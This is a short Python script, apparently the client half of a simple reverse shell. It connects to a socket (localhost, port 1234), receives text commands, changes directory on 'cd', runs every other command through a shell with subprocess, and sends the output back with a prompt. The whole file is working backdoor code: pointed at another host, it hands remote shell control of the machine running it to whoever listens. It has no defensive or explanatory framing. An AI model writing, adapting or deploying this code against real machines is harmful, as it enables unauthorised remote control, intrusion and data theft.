import os
import socket
import subprocess


host = 'localhost'
port = 1234
s = socket.socket()
s.connect((host, port))
while True:
    data = s.recv(1024)
    data = data.decode('utf-8')
    if data[:2] == 'cd':
        os.chdir(data[3:])
    if len(data) > 0:
        cmd = subprocess.Popen(data, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        output_bytes = cmd.stdout.read()    # returns output in bytes
        output_string = str(output_bytes, encoding='utf-8')
        msg = output_string + os.getcwd() + '>'
        s.send(str.encode(msg))

s.close()




